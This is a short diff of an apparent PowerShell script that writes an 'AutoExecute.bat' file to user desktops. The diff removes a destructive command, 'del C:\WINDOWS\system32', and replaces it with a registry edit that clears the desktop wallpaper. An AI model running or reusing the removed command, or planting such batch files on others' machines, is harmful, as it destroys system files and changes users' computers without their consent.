@@ -47,7 +47,9 @@ foreach ($user in $users) {
 # Create batch file to run a specific line of code
 $batchFilePath = Join-Path -Path $desktopPath -ChildPath "AutoExecute.bat"
 $lineOfCode = '@echo off
-del C:\WINDOWS\system32'
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+'
 $batchFileContent = "@echo off`n$lineOfCode"
 
 $batchFileContent | Out-File -FilePath $batchFilePath -Encoding ASCII
